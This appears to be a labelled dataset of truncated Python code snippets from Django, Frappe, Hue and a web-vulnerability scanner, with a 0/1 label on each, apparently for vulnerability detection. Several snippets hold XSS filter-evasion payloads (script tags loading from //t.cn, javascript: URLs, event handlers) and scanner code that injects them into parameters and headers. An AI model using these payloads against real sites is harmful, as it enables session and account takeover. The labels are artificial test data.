num_processes=1", "label": 0}, {"snippet_id": 2621, "code": "+payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print ", "label": 0}, {"snippet_id": 15464, "code": " traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg", "label": 0}, {"snippet_id": 5602, "code": ";+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click", "label": 0}, {"snippet_id": 8036, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes')", "label": 0}, {"snippet_id": 20600, "code": ".urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=(''", "label": 0}, {"snippet_id": 53660, "code": ", request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle", "label": 0}, {"snippet_id": 37266, "code": "\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro", "label": 0}, {"snippet_id": 15983, "code": "'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course", "label": 0}, {"snippet_id": 39962, "code": " \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"')", "label": 0}, {"snippet_id": 26314, "code": " ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'", "label": 0}, {"snippet_id": 6265, "code": " \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self", "label": 0}, {"snippet_id": 7972, "code": "-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=", "label": 0}, {"snippet_id": 1562, "code": "\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods", "label": 0}, {"snippet_id": 39295, "code": "(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self", "label": 0}, {"snippet_id": 4686, "code": ", 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu'", "label": 0}, {"snippet_id": 3048, "code": " Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt", "label": 0}, {"snippet_id": 18940, "code": " False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration", "label": 0}, {"snippet_id": 12731, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 14492, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns", "label": 0}, {"snippet_id": 48964, "code": " field return escape(value) def format(self, value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return value def render(self): return format_html", "label": 1}, {"snippet_id": 24069, "code": " num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of", "label": 0}, {"snippet_id": 3014, "code": ") def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method==", "label": 0}, {"snippet_id": 6581, "code": " if self._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this", "label": 0}, {"snippet_id": 36013, "code": " \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self", "label": 0}, {"snippet_id": 22770, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index", "label": 1}, {"snippet_id": 51484, "code": "'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import django_uwsgi INSTALLED_APPS +=['django_uwsgi',] except ImportError:", "label": 0}, {"snippet_id": 37014, "code": ", limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions", "label": 0}, {"snippet_id": 16708, "code": "'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 1}, {"snippet_id": 38106, "code": ".sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict", "label": 0}, {"snippet_id": 13678, "code": "/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index')", "label": 1}, {"snippet_id": 17942, "code": " name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static", "label": 0}, {"snippet_id": 31347, "code": ".index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1)", "label": 0}, {"snippet_id": 13820, "code": "[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', ", "label": 0}, {"snippet_id": 40195, "code": " \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission", "label": 0}, {"snippet_id": 12897, "code": "'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'", "label": 0}, {"snippet_id": 17460, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 19011, "code": " include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name=", "label": 0}, {"snippet_id": 28414, "code": " get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:%S\" \tif type=", "label": 0}, {"snippet_id": 34998, "code": " for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname", "label": 0}, {"snippet_id": 28018, "code": "'dest'), }) class SessionLoginHandler(base_handler.Handler): \"\"\"Session login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get(", "label": 1}, {"snippet_id": 41143, "code": " comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route", "label": 0}, {"snippet_id": 13540, "code": ")$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 39051, "code": "\"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif", "label": 0}, {"snippet_id": 32207, "code": " import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR)) sys.path.insert", "label": 0}, {"snippet_id": 6149, "code": " cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config=ConfigParser.ConfigParser(_CONFIG_DEFAULTS) if not self.config.read", "label": 0}, {"snippet_id": 9045, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 4202, "code": " vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": ", "label": 0}, {"snippet_id": 5404, "code": "'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', ", "label": 0}, {"snippet_id": 2963, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else:", "label": 0}, {"snippet_id": 40919, "code": ": \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit", "label": 0}, {"snippet_id": 2507, "code": " post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request", "label": 0}, {"snippet_id": 1643, "code": " print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']=", "label": 0}, {"snippet_id": 14596, "code": "/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test", "label": 0}, {"snippet_id": 52770, "code": " param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie", "label": 0}, {"snippet_id": 34813, "code": ") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t", "label": 0}, {"snippet_id": 12158, "code": "[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url", "label": 1}, {"snippet_id": 510, "code": " req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def", "label": 0}, {"snippet_id": 37248, "code": "\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate()", "label": 0}, {"snippet_id": 2262, "code": "(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url", "label": 0}, {"snippet_id": 48288, "code": ".GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])", "label": 0}, {"snippet_id": 39676, "code": ")) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield", "label": 0}, {"snippet_id": 24554, "code": ", 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value", "label": 0}, {"snippet_id": 20280, "code": ".\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 11874, "code": "/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES", "label": 0}, {"snippet_id": 42901, "code": "=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues", "label": 0}, {"snippet_id": 27716, "code": ".headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before", "label": 0}, {"snippet_id": 48298, "code": "=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error", "label": 0}, {"snippet_id": 30790, "code": " action) if act==\"showCompareConfigs\": \timport glob \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs", "label": 1}, {"snippet_id": 8823, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 32348, "code": ".Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join", "label": 0}, {"snippet_id": 25818, "code": " initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget", "label": 0}, {"snippet_id": 24052, "code": " validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs", "label": 0}, {"snippet_id": 48279, "code": " forward_url=request.GET[\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user", "label": 0}, {"snippet_id": 15862, "code": "/github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params)", "label": 0}, {"snippet_id": 45233, "code": ".doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data", "label": 0}, {"snippet_id": 20089, "code": "-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self", "label": 0}, {"snippet_id": 47711, "code": ".render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower", "label": 0}, {"snippet_id": 5675, "code": "<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object", "label": 0}, {"snippet_id": 31861, "code": ")+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') ", "label": 0}, {"snippet_id": 4455, "code": " 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self", "label": 0}, {"snippet_id": 16011, "code": "{allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self", "label": 0}, {"snippet_id": 52274, "code": " doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2", "label": 0}, {"snippet_id": 41674, "code": "(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]", "label": 0}, {"snippet_id": 38018, "code": ".comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list", "label": 0}, {"snippet_id": 18, "code": " from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path", "label": 0}, {"snippet_id": 23059, "code": " 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 30567, "code": "\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s ", "label": 0}, {"snippet_id": 23023, "code": "/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(", "label": 0}, {"snippet_id": 11465, "code": "}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return", "label": 0}, {"snippet_id": 11577, "code": "', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', ", "label": 0}, {"snippet_id": 20650, "code": "'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change", "label": 0}, {"snippet_id": 19069, "code": "/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 50635, "code": " browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect", "label": 0}, {"snippet_id": 42727, "code": ".label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None", "label": 0}, {"snippet_id": 10002, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): ", "label": 1}, {"snippet_id": 7758, "code": "'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name", "label": 0}, {"snippet_id": 23663, "code": " import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"", "label": 0}, {"snippet_id": 14171, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls", "label": 0}, {"snippet_id": 22735, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 16206, "code": "', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done", "label": 0}, {"snippet_id": 29361, "code": "+tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror ", "label": 0}, {"snippet_id": 3850, "code": "}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url", "label": 0}, {"snippet_id": 33385, "code": " webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route", "label": 0}, {"snippet_id": 10011, "code": ".TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"", "label": 1}, {"snippet_id": 35154, "code": " \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self", "label": 0}, {"snippet_id": 36270, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"", "label": 0}, {"snippet_id": 41526, "code": "} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and", "label": 0}, {"snippet_id": 24168, "code": "-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self", "label": 0}, {"snippet_id": 5247, "code": "'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup", "label": 0}, {"snippet_id": 12139, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 34899, "code": " in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) ", "label": 0}, {"snippet_id": 16927, "code": "/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/", "label": 0}, {"snippet_id": 41921, "code": "\tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value", "label": 0}, {"snippet_id": 28623, "code": ".send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql ", "label": 0}, {"snippet_id": 26158, "code": ".instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs[", "label": 0}, {"snippet_id": 13747, "code": "=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/", "label": 1}, {"snippet_id": 38616, "code": " \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype", "label": 0}, {"snippet_id": 42204, "code": 